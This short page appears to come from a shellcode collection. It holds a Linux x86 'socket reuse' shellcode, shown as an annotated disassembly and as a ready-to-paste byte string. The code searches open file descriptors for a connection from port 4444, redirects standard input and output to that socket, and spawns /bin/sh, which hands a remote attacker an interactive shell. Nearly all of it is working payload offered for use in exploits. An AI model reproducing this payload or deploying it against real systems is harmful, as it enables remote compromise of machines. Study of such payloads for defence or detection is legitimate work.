 Reuse Socket Shellcode <br />================================================================================<br /><br />A simple socket reuse for linux system. Three system calls, socket, dup2 and execve<br /><br /><br />0:  31 db                   xor    ebx,ebx<br />2:  53                      push   ebx<br />3:  89 e7                   mov    edi,esp<br />5:  6a 10                   push   0x10<br />7:  54                      push   esp<br />8:  57                      push   edi<br />9:  53                      push   ebx<br />a:  89 e1                   mov    ecx,esp<br />c:  b3 07                   mov    bl,0x7<br />e:  ff 01                   inc    DWORD PTR [ecx]<br />10: 6a 66                   push   0x66<br />12: 58                      pop    eax<br />13: cd 80                   int    0x80<br />15: 66 81 7f 02 11 5c       cmp    WORD PTR [edi+0x2],0x5c11<br />1b: 75 f1                   jne    0xe<br />1d: 5b                      pop    ebx<br />1e: 6a 02                   push   0x2<br />20: 59                      pop    ecx<br />21: b0 3f                   mov    al,0x3f<br />23: cd 80                   int    0x80<br />25: 49                      dec    ecx<br />26: 79 f9                   jns    0x21<br />28: 50                      push   eax<br />29: 68 2f 2f 73 68          push   0x68732f2f<br />2e: 68 2f 62 69 6e          push   0x6e69622f<br />33: 89 e3                   mov    ebx,esp<br />35: 50                      push   eax<br />36: 53                      push   ebx<br />37: 89 e1                   mov    ecx,esp<br />39: 99                      cdq<br />3a: b0 0b                   mov    al,0xb<br />3c: cd 80                   int    0x80<br /><br /><br /><br /><br />

 shellcode_socket_reuse = (<br />"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff"<br />"\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x11\x5c\x75\xf1\x5b"<br />"\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73"<br />"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"<br />"\xcd\x80")<br /><br /><br /><br />